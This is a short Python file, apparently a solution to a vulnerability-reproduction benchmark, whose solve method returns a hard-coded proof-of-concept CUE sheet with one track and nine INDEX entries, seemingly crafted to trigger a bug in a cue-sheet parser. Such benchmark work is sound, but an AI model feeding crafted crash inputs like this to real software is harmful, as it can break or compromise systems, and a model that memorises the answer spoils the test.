class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'''FILE "audio.flac" FLAC
TRACK 01 AUDIO
INDEX 01 00:00:00
INDEX 02 00:00:15
INDEX 03 00:00:30
INDEX 04 00:00:45
INDEX 05 00:01:00
INDEX 06 00:01:15
INDEX 07 00:01:30
INDEX 08 00:01:45
INDEX 09 00:02:00
'''
        return poc
